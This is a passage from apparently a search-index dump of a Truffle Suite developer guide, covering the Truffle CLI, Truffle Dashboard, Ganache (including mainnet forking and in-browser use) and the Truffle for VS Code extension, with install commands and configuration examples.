them. Part four: Truffle Command Line Interface \u00b6 This is a powerful command-line tool that provides developers with a wide range of functionality for building, testing, and deploying smart contracts on the Ethereum blockchain. At its core, the Truffle CLI provides a suite of commands for compiling, testing, and deploying smart contracts, as well as for interacting with the Ethereum network. These commands can perform a wide range of tasks, from compiling contracts and generating boilerplate code to testing contracts and deploying them to the blockchain. One of the key features of the Truffle CLI is its integration with other Truffle tools and frameworks, such as Ganache UI (a local blockchain simulator), Drizzle (a front-end library for building dapps), and Web3.js (a library for interacting with the Ethereum network). This integration makes it easy for developers to build, test, and deploy complex dapps using a single, unified toolset. Prerequisites: \u00b6 Node.js (version 14 or later) NPM (Node Package Manager) Installation \u00b6 Install the Truffle CLI globally by running the following command: npm install -g truffle Once the installation is complete, verify that the Truffle CLI has been installed correctly by running the following command: truffle version This command should display the version number of the Truffle CLI, indicating that it has been successfully installed. Install additional dependencies needed by the Truffle CLI, such as the Ganache CLI. To install Ganache CLI, for example, run the following command: npm install -g ganache Create a project \u00b6 There are a number of ways to create a Truffle project, one is the Truffle box option that allows you to use Truffle Boxes, which are example applications and project templates. mkdir MetaCoin cd MetaCoin truffle unbox metacoin And the other option is to create a bare project that doesn\u2019t come with any smart contract or boilerplate code, to use this option, run: truffle init If you examine the newly created project structure, you\u2019ll find the following items: . \u251c\u2500\u2500 contracts <-- solidity contracts live here \u251c\u2500\u2500 migrations <-- migration scripts live here \u251c\u2500\u2500 test <-- tests (Solidity and JS) live here \u2514\u2500\u2500 truffle-config.js <-- truffle configuration file Compile your project \u00b6 To compile your Truffle project, navigate to the project root directory and run the truffle compile command. Truffle will go through the contracts/ directory, compiling every file and library that ends with .sol . Upon the first run, all contracts will be compiled. Upon subsequent runs, Truffle will compile only the contracts that have been changed since the last compile. If you'd like to override this behavior, run the above command with the --all option. See the documentation for more information. Test your contracts \u00b6 Truffle comes bundled with an automated testing framework to make testing your contracts easy. Automated tests can be written in both JavaScript/TypeScript and Solidity, with their respective advantages and disadvantages. Truffle looks for test files inside the test/ directory\" To run all tests, simply run: truffle test Alternatively, you can specify a path to a specific file you want to run, e.g., truffle test ./path/to/test/file.js More on testing with Truffle on the official documentation . Debugging with console.log \u00b6 Debugging is an essential part of building dapps, especially because you want to minimise bugs since smart contracts are deployed on the public blockchain. To facilitate debugging, Truffle CLI supports logging variables and messages to the console out of the box. To use this feature, simply ensure that you are running the latest version of Truffle CLI. Here's an example of how to use console.log in your code: // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"truffle/console.sol\"; contract SampleContract { address public admin; constructor(address _admin) { console.log(\"SampleContract::constructor\\n\\tadmin: %o\", _admin); admin = _admin; } } If you wish to modify this feature, you can personalize it by adding a prefix to log messages for easier identification or by enabling a safety mechanism to avoid deploying console.log statements to the mainnet. You can find more information about how to do this in this blog post . Deploying a smart contract \u00b6 Truffle uses a script-based deployment system that allows developers to write custom scripts in JavaScript to automate the deployment of smart contracts to the Ethereum network (EVM). To use Truffle's script-based deployment system, you will need to create a migration script in the migrations directory of your Truffle project. Migration scripts are named numerically to indicate their order of execution, and they typically include instructions for deploying one or more smart contracts to the Ethereum (EVM) network. A typical migration script would look like this: const MyContract = artifacts.require(\"MyContract\"); module.exports = function(deployer) { deployer.deploy(MyContract); }; Once you have written your migration script, you can run it using the Truffle migration command: truffle migrate [--reset] [--network NETWORK_NAME] This command will execute all migration scripts that have not already been executed on the specified network. You can use the --reset option to re-run all migration scripts from scratch, and you can use the --network option to specify the target network for deployment. Check out the documentation for a more detailed walkthrough of how deployment works in Truffle. Part five: Truffle Dashboard \u00b6 To deploy your smart contract, you need to specify an Ethereum account that has enough funds to cover the transaction fees of the deployment. To do this, you\u2019d typically copy-paste your mnemonic phrase to a .gitignored .env file. This is necessary because your mnemonic or private key gives Truffle the necessary ability to sign transactions on your behalf. Truffle Dashboard completely removes the need to share your mnemonic phrase or private keys throughout the development lifecycle. You can now safely deploy your smart contracts to your network of choice without Truffle ever needing to know what your keys look like. Truffle seamlessly connects to your MetaMask wallet without any configuration using the currently selected account and network for Truffle's deployment configuration. Installation \u00b6 If you have the Truffle CLI installed, accessing the Truffle Dashboard is made possible as it comes bundled with it. If you\u2019re running an older version of Truffle CLI that doesn\u2019t ship with the Dashboard, consider upgrading to the latest version by running the following commands: npm uninstall -g truffle npm install -g truffle Quick Start \u00b6 Running truffle dashboard in a separate terminal window starts Truffle Dashboard at http://localhost:24012 and automatically opens a new tab in your browser. truffle dashboard [--port <number>] [--host <string>] [--verbose] Truffle Dashboard running at [http://localhost:24012](http://localhost:24012) DashboardProvider RPC endpoint running at [http://localhost:24012/rpc](http://localhost:24012/rpc) With Truffle Dashboard running, you\u2019ll be prompted to connect your wallet and confirm that you're connected to the right network. You should double-check your connected network at this point since switching to a different network during deployment can have unintended consequences. To deploy your contracts using Truffle Dashboard, run the command: truffle migrate --network dashboard This is possible because Truffle exposes a built-in network named \"dashboard\" . This network automatically uses the port and host specified in the dashboard configuration or falls back to the default [http://localhost:24012](http://localhost:24012) Now, subsequent RPC requests will be forwarded to the Truffle Dashboard, where the user can inspect the RPC requests and approve or decline them on MetaMask. Configuration \u00b6 The port and host can be configured through command line options, or by configuring them inside your truffle-config.js. On the command line: truffle dashboard --port <port of choice> --host <host of choice>` In your Truffle configuration (truffle-config.js) file: module.exports = { ... dashboard: { port: 25012, host: \"localhost\" } } Transaction decoding \u00b6 Truffle Dashboard uses the @truffle/decoder library we described earlier to decode requests from certain RPC calls for example eth_sendTransaction, personal_sign, eth_signTypedData_v3, and eth_signTypedData_v4. This allows you to view a more human-friendly representation of the messaging between your computer and the Ethereum network. For example, if you have a contract that allows you to mint 5 tokens and send it to a user (myaccount.eth in this example), the low-level form would look something like this: `0xa0e9439c000000000000000000000000627306090abab3a6e1400e9345bc60c78a8bef570000000000000000000000000000000000000000000000000000000000000005` Truffle Dashboard can display this in a more human-readable format, for example: mint(myaccount.eth, 5) Using Truffle Dashboard with Hardhat \u00b6 Truffle Dashboard now offers full support for Hardhat projects through the @truffle/dashboard-hardhat-plugin . Prior to this plugin, Hardhart users were not able to see decoded transaction information, including function names and all argument values. This plugin adds that, providing extra visibility into a transaction before you issue a signature using your browser-based wallet. Here\u2019s a screenshot of the before and after: You can install this plugin by running: npm install --save-dev @truffle/dashboard-hardhat-plugin Then simply import the plugin in your hardhat.config.ts: import \"@truffle/dashboard-hardhat-plugin\"; To use this plugin, you are required to have Truffle installed either globally or in a local project. If it's not installed, you can install it using the command npm i -g truffle . Alternatively, you can skip the installation and use npx truffle dashboard to fetch and run it remotely. This plugin automatically adds the truffleDashboard , so there's no need to add it manually to hardhat.config.ts . You can start using this plugin by specifying --network truffleDashboard when running Hardhat commands e.g., npx hardhat run ./scripts/deploy-contracts.ts --network truffleDashboard . The truffleDashboard network includes sensible defaults and the URL property is set to http://localhost:24012/rpc . Part six: Ganache \u00b6 Ganache is a local blockchain simulator or a personal blockchain for dapp development, It allows developers to simulate an Ethereum network locally on their machine, making it easier and faster to test and debug smart contracts without having to deploy them on a live network. It also allows developers to customize the blockchain to suit their testing needs. For example, developers can specify the number of accounts on the blockchain, the initial balance of each account, the gas limit for each block, the block time and more. In addition to usage via the CLI from within JavaScript programmatically, ganache also provides a GUI, aptly named Ganache UI. Ganache UI provides a graphical user interface that displays useful information such as account balances, transactions, and gas usage, making it easier for developers to understand the behavior of their smart contracts. Installation \u00b6 Ganache comes in two forms, as a UI and as a CLI, but it can be used in three ways: UI , CLI , and programmatically . Ganache UI can be downloaded from the Truffle Suite website while the ganache npm package can be installed with the following command: npm install ganache --global You\u2019re required to have Node.js >= v14.0.0 and NPM >= 6.4.1 installed on your computer to be able to run Ganache. How to connect a Truffle project to Ganache \u00b6 To link a Truffle project with Ganache, make sure that a Ganache instance is active in the background. You can initiate a CLI instance by executing the command ganache in the terminal or launch a UI instance by clicking the Ganache icon after downloading it. Depending on which one you choose, you'll have access to 10 accounts, each with 100 ether at your disposal. In a separate terminal window, navigate to your Truffle project directory and run the following command to compile your smart contracts: truffle compile Next, you need to configure Truffle to use the Ganache network by updating the truffle-config.js file in your project directory. Open the file and update the networks section as follows: Ganache CLI: module.exports = { networks: { development: { host: \"127.0.0.1\", port: 8545, network_id: \"*\", // Match any network id }, }, // ...rest of your config } Ganache UI: module.exports = { networks: { development: { host: \"127.0.0.1\", port: 7545, network_id: \"*\", // Match any network id }, }, // ...rest of your config } The above code snippets tells Truffle to connect to the local Ganache blockchain running on localhost at port 8545 (CLI) or 7545 (UI). Once you've updated the configuration file, you can deploy your smart contracts to the Ganache network using the following command: truffle migrate --network development This will deploy your smart contracts to the Ganache network, and you should see the output in your terminal indicating the status of the deployment. Forking \u00b6 A very useful step in software development is being able to test applications in a sandbox environment that closely resembles the production environment in which the application is going to live. This is particularly important in web3 and dapp development since we want to ensure that our dapps work as expected before deploying to a live network. Ganache as mentioned earlier, acts like a sandbox environment for dapp development but the forking feature makes it even more interesting as it allows developers to make a copy of the Ethereum blockchain\u2019s state. This means that developers can now develop dapps in an environment that closely resembles production. This isn\u2019t only limited to Ethereum mainnet as you can also fork any Ethereum testnet as well. To use this feature, start an instance of Ganache on the command line, passing in the --fork flag like so: ganache --fork This command creates a fork of Ethereum Mainnet. Alternatively, you can specify which network to fork using the --fork.network option. ganache --fork.network <network name> By default, Ganache uses Infura as the blockchain provider but you can specify the provider URL to use with the --fork.url option. ganache --fork.url <URL> Time manipulation \u00b6 Ganache also supports time manipulation during testing, e.g fast forwarding and rewinding time. This is particularly useful when testing a smart contract that requires that a specific time passes before users can take certain actions. Ganache exposes two RPC methods for manipulating time during testing: evm_increaseTime evm_setTime Ganache in the browser \u00b6 Ganache can be used in the browser with this line of code: <script src=\"[https://cdn.jsdelivr.net/npm/ganache@](https://cdn.jsdelivr.net/npm/ganache@)>VERSION NUMBER>/dist/web/ganache.min.js\"></script> If you specify the version number 7.3.2 or greater, you also get the zero-config mainnet forking feature. The latest version as of the time of writing is 7.8.0. You can try this out with the below code sample. <script src=\"https://cdn.jsdelivr.net/npm/ganache@7.8.0/dist/web/ganache.min.js\"></script> <script> const options = { fork: { network: \"mainnet\" } } const provider = Ganache.provider(options); <script> Now verify that this is working by attempting to fetch a mainnet block using the eth_getBlockByNumber method: const block = await provider.request({ method: \"eth_getBlockByNumber\", params: [\"0xec4eb0\"] }); console.log(block); // will be mainnet's block 15486640 Here\u2019s a sample HTML code that puts it all together: <!DOCTYPE html> <html> <head> <meta charset=\"UTF-8\"> <title>Ganache Example</title> </head> <body> <h1>Ganache Example</h1> <script src=\"https://cdn.jsdelivr.net/npm/ganache@7.8.0/dist/web/ganache.min.js\"></script> <script> (async function() { const options = { fork: { network: \"mainnet\" } } const provider = Ganache.provider(options); const block = await provider.request({ method: \"eth_getBlockByNumber\", params: [\"0xec4eb0\"] }); console.log(block); // will be mainnet's block 15486640 })() </script> </body> </html> Part seven: Truffle for VS Code Extension \u00b6 The Truffle for VS Code extension simplifies how you create, build, debug and deploy smart contracts on Ethereum and all EVM-based blockchains and layer 2. The extension has built-in integration with many tools and services including Truffle, Ganache, and Infura. It combines all the important features of Truffle CLI, Ganache and Infura into a single, more user-friendly user experience so that you do not have to leave Visual Studio while building a dapp. Truffle for VS Code also offers comprehensive native IDE Solidity debugging support, taking advantage of VS Code's great debugging features such as variables, watches, and breakpoints. This means that you no longer need to jump between different tools or windows while you edit, compile, deploy, transact, and debug smart contracts. Installation \u00b6 Truffle for VS Code can be installed from the VS Code marketplace . After installation, the extension may ask you to install certain local dependencies if you haven't done so already. But, don't worry! We have created a helpful guide to make the installation process smooth and easy. Create project \u00b6 The Truffle extension for VS Code provides an easy way for developers to create a new Solidity project using the Command Palette. If you are not familiar with Truffle, this is a simple way to scaffold out a project directory. Just select \"Truffle: New Solidity Project\" from the Command Palette, choose an empty directory, give your project a name, and hit Enter. Alternatively, you can also use the Truffle CLI directly from the VS Code terminal by running truffle init . Compile contract \u00b6 After creating a project directory, it will include a basic contract and all the necessary files to build and deploy a simple working contract to an RPC endpoint. To build your contract, simply select the Solidity (.sol) file of your contract, right-click on it, and choose \"Truffle: Build Contracts\". That's it! Deploy contract \u00b6 Once you've compiled your contract, the contract metadata (including the contract ABI and bytecode) will be available in a .json file located in the ./build directory. To deploy your compiled contract, right-click on the Solidity (.sol) file and select \"Truffle: Deploy Contracts\". The extension will start a Ganache instance by default and deploy the contract to a local network. For more information on how you can deploy to any Ethereum network through Infura, see Truffle for VS Code documentation. . Debug contract \u00b6 Truffle for VS Code extension comes bundled with the Truffle debugger, you can use the debugger by following these steps: Start the debugger by selecting Truffle: Debug Transaction in the command palette which can be accessed using Ctrl + Shift + P for Windows or \u2318 + Shift + P for Macs. Then select the network to debug against. Select the transaction hash to debug. The VSCode debugger launches, and you can use typical debugger functions such as watch windows, view the call stack, and step in/out/over. See the documentation for more information. Conclusion \u00b6 Truffle simplifies the development lifecycle for EVM-based applications. Its library-first approach and suite of developer tools for every stage of development enable developers to ensure their code is thoroughly tested and ready for deployment, while reducing the risk of bugs and errors. Building with Truffle has several benefits, including increased efficiency, reduced development time, and improved code quality. Truffle can be easily integrated with other tools, giving you even more power and flexibility to create blockchain applications. The Truffle Suite, which includes a Command Line Interface, Dashboard, Ganache, and VS Code Extension, all work together seamlessly to help you create, test, and deploy your blockchain applications with ease. If you're a blockchain developer looking to enhance your development experience, consider Truffle as an essential resource for full stack blockchain development.", "title": "Ultimate Guide to Truffle: The Gateway to Full Stack Blockchain Development"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development", "text": "Written by Kingsley Arinze Last updated 05/03/2023 The Ultimate Guide to Truffle showcases everything developers need to get started using Truffle for blockchain development, providing an overview of core features such as Truffle Dashboard, Command Line Interface, VS Code, and Ganache.", "title": "Ultimate Guide to Truffle: The Gateway to Full Stack Blockchain Development"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#overview", "text": "The Ultimate Guide to Truffle introduces all the components of Truffle to get started building full stack blockchain applications. Truffle is a suite of development environment tooling for web3 developers to simplify the development lifecycle for EVM-based applications. It was the first development environment software created for Ethereum and has existed since 2015. This guide covers Truffle's library-first approach, touching on the fundamental building blocks of Truffle and how it's composed for building blockchain applications. The benefits of building with the Truffle Suite are outlined and ways to use Truffle together with other tools. Finally, the guide covers the tools within the Truffle Suite, how each functions to improve your development process, and how to get started using them. Index: Part 1: What is Truffle? Part 2: The Benefits of Building with Truffle Part 3: Truffle Suite Core Features and Tooling Part 4: Truffle Command Line Interface Part 5: Truffle Dashboard Part 6: Ganache Part 7: Truffle for VS Code Extension", "title": "Overview"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#part-one-what-is-truffle", "text": "Truffle is a collection of tools that simplifies the development of blockchain-based applications on EVM-compatible networks. It includes tooling to help you, the developer, throughout your development cycle, from coding and testing to debugging and deployment. Truffle focuses on the development of smart contracts, which are the foundation of EVM applications. It also includes tools for developing front-end applications that interact with smart contracts and a comprehensive suite of testing and debugging tools. This allows developers to quickly and easily build and test their applications, reducing development time and increasing the reliability of the final product. At its core, Truffle is made up of free and open-source software (FOSS) libraries. These libraries are built to be platform agnostic and interoperable, meaning they can be plugged into other tools fairly easily e.g. @truffle/fetch-and-compile , @truffle/codec , and @truffle/debugger . Each library is assembled to form tools like Truffle\u2019s CLI (command-line interface), Truffle Dashboard, Truffle Debugger, Truffle for VS Code extension, and Ganache. Together, these make up the Truffle Suite of tools.", "title": "Part one: What is Truffle?"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#part-two-the-benefits-of-building-with-truffle", "text": "Truffle allows developers to code, test, debug, and deploy smart contracts to Ethereum and other EVM-compatible blockchain networks. Here are some benefits that make Truffle a standout in the Ethereum ecosystem: Insight into Transaction Details: Truffle Dashboard lets you inspect transactions before they occur by giving you more digestible information to more confidently approve or reject transactions. Diagnose and fix errors quickly: The Truffle Debugger together with Truffle\u2019s testing suite allows you to surgically diagnose errors when they occur and fix them quickly Focus on your dapp\u2019s uniqueness: Truffle offers a workflow that gets out of your way and lets you focus on your dapp\u2019s unique functionality. It\u2019s prescriptive enough to provide guidance, yet flexible enough to adapt to your needs. Operate safely: With Ganache\u2019s zero-config mainnet forking, you can easily test against live networks without spending real Ether. You can execute risky transactions in a sandbox and test integrations with production smart contracts, all with the same human-readable information and debugging tools you use for development networks. Applicable at all stages of development: Regardless of whether your project began with Truffle CLI or another framework, Truffle can provide tooling and insights. We also support a number of different protocols and offer the ability to easily add support for new ones.", "title": "Part two: The Benefits of Building with Truffle"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#part-three-truffle-suite-core-features-and-tooling", "text": "As mentioned earlier, Truffle isn\u2019t a single tool, but a suite of tools that come together to create a smooth development experience. These tools include Truffle CLI, Truffle Dashboard, Ganache, and Truffle for VS code. Before we delve into each of these tools, their features, and how you can start using them, let's review the underlying libraries that power these tools. A. Truffle Debugger ( @truffle/debugger ) is a portable Solidity debugger library that can be used with or without Truffle. It is a standalone package that is available on NPM, which means that anyone can install this library and use it as is, or build on it to offer an even better experience. Truffle\u2019s debugger is at the heart of every Truffle tool including Truffle CLI, and Truffle for VS Code with plans to integrate it into Truffle Dashboard. Some of its features are: Solidity stepping and breakpoints Variable inspection Watch expressions Rudimentary support for Vyper and more! B. Truffle Encoder & Decoder ( @truffle/codec ) library provides an interface for decoding Solidity smart contract state and information sent to, or from smart contracts using the Solidity ABI. It produces output in a machine-readable form that avoids losing any information. This is a low-level package for encoding, decoding, and data representation. C. Truffle Fetch & Compile ( @truffle/fetch-and-compile ) is a library that is used to obtain externally verified sources and compile them. It is important to note that, while these libraries form the core of Truffle, they can be used stand-alone or together with other tools within the ecosystem. Let\u2019s take a deeper look at some of the user-facing tools within the Truffle Suite and how to get started with them.", "title": "Part three: Truffle Suite Core Features and Tooling"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#part-four-truffle-command-line-interface", "text": "This is a powerful command-line tool that provides developers with a wide range of functionality for building, testing, and deploying smart contracts on the Ethereum blockchain. At its core, the Truffle CLI provides a suite of commands for compiling, testing, and deploying smart contracts, as well as for interacting with the Ethereum network. These commands can perform a wide range of tasks, from compiling contracts and generating boilerplate code to testing contracts and deploying them to the blockchain. One of the key features of the Truffle CLI is its integration with other Truffle tools and frameworks, such as Ganache UI (a local blockchain simulator), Drizzle (a front-end library for building dapps), and Web3.js (a library for interacting with the Ethereum network). This integration makes it easy for developers to build, test, and deploy complex dapps using a single, unified toolset.", "title": "Part four: Truffle Command Line Interface"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#prerequisites", "text": "Node.js (version 14 or later) NPM (Node Package Manager)", "title": "Prerequisites:"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#installation", "text": "Install the Truffle CLI globally by running the following command: npm install -g truffle Once the installation is complete, verify that the Truffle CLI has been installed correctly by running the following command: truffle version This command should display the version number of the Truffle CLI, indicating that it has been successfully installed. Install additional dependencies needed by the Truffle CLI, such as the Ganache CLI. To install Ganache CLI, for example, run the following command: npm install -g ganache", "title": "Installation"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#create-a-project", "text": "There are a number of ways to create a Truffle project, one is the Truffle box option that allows you to use Truffle Boxes, which are example applications and project templates. mkdir MetaCoin cd MetaCoin truffle unbox metacoin And the other option is to create a bare project that doesn\u2019t come with any smart contract or boilerplate code, to use this option, run: truffle init If you examine the newly created project structure, you\u2019ll find the following items: . \u251c\u2500\u2500 contracts <-- solidity contracts live here \u251c\u2500\u2500 migrations <-- migration scripts live here \u251c\u2500\u2500 test <-- tests (Solidity and JS) live here \u2514\u2500\u2500 truffle-config.js <-- truffle configuration file", "title": "Create a project"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#compile-your-project", "text": "To compile your Truffle project, navigate to the project root directory and run the truffle compile command. Truffle will go through the contracts/ directory, compiling every file and library that ends with .sol . Upon the first run, all contracts will be compiled. Upon subsequent runs, Truffle will compile only the contracts that have been changed since the last compile. If you'd like to override this behavior, run the above command with the --all option. See the documentation for more information.", "title": "Compile your project"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#test-your-contracts", "text": "Truffle comes bundled with an automated testing framework to make testing your contracts easy. Automated tests can be written in both JavaScript/TypeScript and Solidity, with their respective advantages and disadvantages. Truffle looks for test files inside the test/ directory\" To run all tests, simply run: truffle test Alternatively, you can specify a path to a specific file you want to run, e.g., truffle test ./path/to/test/file.js More on testing with Truffle on the official documentation .", "title": "Test your contracts"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#debugging-with-consolelog", "text": "Debugging is an essential part of building dapps, especially because you want to minimise bugs since smart contracts are deployed on the public blockchain. To facilitate debugging, Truffle CLI supports logging variables and messages to the console out of the box. To use this feature, simply ensure that you are running the latest version of Truffle CLI. Here's an example of how to use console.log in your code: // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"truffle/console.sol\"; contract SampleContract { address public admin; constructor(address _admin) { console.log(\"SampleContract::constructor\\n\\tadmin: %o\", _admin); admin = _admin; } } If you wish to modify this feature, you can personalize it by adding a prefix to log messages for easier identification or by enabling a safety mechanism to avoid deploying console.log statements to the mainnet. You can find more information about how to do this in this blog post .", "title": "Debugging with console.log"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#deploying-a-smart-contract", "text": "Truffle uses a script-based deployment system that allows developers to write custom scripts in JavaScript to automate the deployment of smart contracts to the Ethereum network (EVM). To use Truffle's script-based deployment system, you will need to create a migration script in the migrations directory of your Truffle project. Migration scripts are named numerically to indicate their order of execution, and they typically include instructions for deploying one or more smart contracts to the Ethereum (EVM) network. A typical migration script would look like this: const MyContract = artifacts.require(\"MyContract\"); module.exports = function(deployer) { deployer.deploy(MyContract); }; Once you have written your migration script, you can run it using the Truffle migration command: truffle migrate [--reset] [--network NETWORK_NAME] This command will execute all migration scripts that have not already been executed on the specified network. You can use the --reset option to re-run all migration scripts from scratch, and you can use the --network option to specify the target network for deployment. Check out the documentation for a more detailed walkthrough of how deployment works in Truffle.", "title": "Deploying a smart contract"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#part-five-truffle-dashboard", "text": "To deploy your smart contract, you need to specify an Ethereum account that has enough funds to cover the transaction fees of the deployment. To do this, you\u2019d typically copy-paste your mnemonic phrase to a .gitignored .env file. This is necessary because your mnemonic or private key gives Truffle the necessary ability to sign transactions on your behalf. Truffle Dashboard completely removes the need to share your mnemonic phrase or private keys throughout the development lifecycle. You can now safely deploy your smart contracts to your network of choice without Truffle ever needing to know what your keys look like. Truffle seamlessly connects to your MetaMask wallet without any configuration using the currently selected account and network for Truffle's deployment configuration.", "title": "Part five: Truffle Dashboard"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#installation_1", "text": "If you have the Truffle CLI installed, accessing the Truffle Dashboard is made possible as it comes bundled with it. If you\u2019re running an older version of Truffle CLI that doesn\u2019t ship with the Dashboard, consider upgrading to the latest version by running the following commands: npm uninstall -g truffle npm install -g truffle", "title": "Installation"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#quick-start", "text": "Running truffle dashboard in a separate terminal window starts Truffle Dashboard at http://localhost:24012 and automatically opens a new tab in your browser. truffle dashboard [--port <number>] [--host <string>] [--verbose] Truffle Dashboard running at [http://localhost:24012](http://localhost:24012) DashboardProvider RPC endpoint running at [http://localhost:24012/rpc](http://localhost:24012/rpc) With Truffle Dashboard running, you\u2019ll be prompted to connect your wallet and confirm that you're connected to the right network. You should double-check your connected network at this point since switching to a different network during deployment can have unintended consequences. To deploy your contracts using Truffle Dashboard, run the command: truffle migrate --network dashboard This is possible because Truffle exposes a built-in network named \"dashboard\" . This network automatically uses the port and host specified in the dashboard configuration or falls back to the default [http://localhost:24012](http://localhost:24012) Now, subsequent RPC requests will be forwarded to the Truffle Dashboard, where the user can inspect the RPC requests and approve or decline them on MetaMask.", "title": "Quick Start"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#configuration", "text": "The port and host can be configured through command line options, or by configuring them inside your truffle-config.js. On the command line: truffle dashboard --port <port of choice> --host <host of choice>` In your Truffle configuration (truffle-config.js) file: module.exports = { ... dashboard: { port: 25012, host: \"localhost\" } }", "title": "Configuration"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#transaction-decoding", "text": "Truffle Dashboard uses the @truffle/decoder library we described earlier to decode requests from certain RPC calls for example eth_sendTransaction, personal_sign, eth_signTypedData_v3, and eth_signTypedData_v4. This allows you to view a more human-friendly representation of the messaging between your computer and the Ethereum network. For example, if you have a contract that allows you to mint 5 tokens and send it to a user (myaccount.eth in this example), the low-level form would look something like this: `0xa0e9439c000000000000000000000000627306090abab3a6e1400e9345bc60c78a8bef570000000000000000000000000000000000000000000000000000000000000005` Truffle Dashboard can display this in a more human-readable format, for example: mint(myaccount.eth, 5)", "title": "Transaction decoding"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#using-truffle-dashboard-with-hardhat", "text": "Truffle Dashboard now offers full support for Hardhat projects through the @truffle/dashboard-hardhat-plugin . Prior to this plugin, Hardhart users were not able to see decoded transaction information, including function names and all argument values. This plugin adds that, providing extra visibility into a transaction before you issue a signature using your browser-based wallet. Here\u2019s a screenshot of the before and after: You can install this plugin by running: npm install --save-dev @truffle/dashboard-hardhat-plugin Then simply import the plugin in your hardhat.config.ts: import \"@truffle/dashboard-hardhat-plugin\"; To use this plugin, you are required to have Truffle installed either globally or in a local project. If it's not installed, you can install it using the command npm i -g truffle . Alternatively, you can skip the installation and use npx truffle dashboard to fetch and run it remotely. This plugin automatically adds the truffleDashboard , so there's no need to add it manually to hardhat.config.ts . You can start using this plugin by specifying --network truffleDashboard when running Hardhat commands e.g., npx hardhat run ./scripts/deploy-contracts.ts --network truffleDashboard . The truffleDashboard network includes sensible defaults and the URL property is set to http://localhost:24012/rpc .", "title": "Using Truffle Dashboard with Hardhat"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#part-six-ganache", "text": "Ganache is a local blockchain simulator or a personal blockchain for dapp development, It allows developers to simulate an Ethereum network locally on their machine, making it easier and faster to test and debug smart contracts without having to deploy them on a live network. It also allows developers to customize the blockchain to suit their testing needs. For example, developers can specify the number of accounts on the blockchain, the initial balance of each account, the gas limit for each block, the block time and more. In addition to usage via the CLI from within JavaScript programmatically, ganache also provides a GUI, aptly named Ganache UI. Ganache UI provides a graphical user interface that displays useful information such as account balances, transactions, and gas usage, making it easier for developers to understand the behavior of their smart contracts.", "title": "Part six: Ganache"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#installation_2", "text": "Ganache comes in two forms, as a UI and as a CLI, but it can be used in three ways: UI , CLI , and programmatically . Ganache UI can be downloaded from the Truffle Suite website while the ganache npm package can be installed with the following command: npm install ganache --global You\u2019re required to have Node.js >= v14.0.0 and NPM >= 6.4.1 installed on your computer to be able to run Ganache.", "title": "Installation"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#how-to-connect-a-truffle-project-to-ganache", "text": "To link a Truffle project with Ganache, make sure that a Ganache instance is active in the background. You can initiate a CLI instance by executing the command ganache in the terminal or launch a UI instance by clicking the Ganache icon after downloading it. Depending on which one you choose, you'll have access to 10 accounts, each with 100 ether at your disposal. In a separate terminal window, navigate to your Truffle project directory and run the following command to compile your smart contracts: truffle compile Next, you need to configure Truffle to use the Ganache network by updating the truffle-config.js file in your project directory. Open the file and update the networks section as follows: Ganache CLI: module.exports = { networks: { development: { host: \"127.0.0.1\", port: 8545, network_id: \"*\", // Match any network id }, }, // ...rest of your config } Ganache UI: module.exports = { networks: { development: { host: \"127.0.0.1\", port: 7545, network_id: \"*\", // Match any network id }, }, // ...rest of your config } The above code snippets tells Truffle to connect to the local Ganache blockchain running on localhost at port 8545 (CLI) or 7545 (UI). Once you've updated the configuration file, you can deploy your smart contracts to the Ganache network using the following command: truffle migrate --network development This will deploy your smart contracts to the Ganache network, and you should see the output in your terminal indicating the status of the deployment.", "title": "How to connect a Truffle project to Ganache"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#forking", "text": "A very useful step in software development is being able to test applications in a sandbox environment that closely resembles the production environment in which the application is going to live. This is particularly important in web3 and dapp development since we want to ensure that our dapps work as expected before deploying to a live network. Ganache as mentioned earlier, acts like a sandbox environment for dapp development but the forking feature makes it even more interesting as it allows developers to make a copy of the Ethereum blockchain\u2019s state. This means that developers can now develop dapps in an environment that closely resembles production. This isn\u2019t only limited to Ethereum mainnet as you can also fork any Ethereum testnet as well. To use this feature, start an instance of Ganache on the command line, passing in the --fork flag like so: ganache --fork This command creates a fork of Ethereum Mainnet. Alternatively, you can specify which network to fork using the --fork.network option. ganache --fork.network <network name> By default, Ganache uses Infura as the blockchain provider but you can specify the provider URL to use with the --fork.url option. ganache --fork.url <URL>", "title": "Forking"}, {"location": "guides/ultimate-guide-to-truffle-the-gateway-to-full-stack-blockchain-development/#time-manipulation", "text": "Ganache also supports time manipulation during testing, e.g fast forwarding and rewinding time. This is particularly useful when testing a smart contract that requires that a specific time passes before users can take certain actions. Ganache exposes two RPC methods for 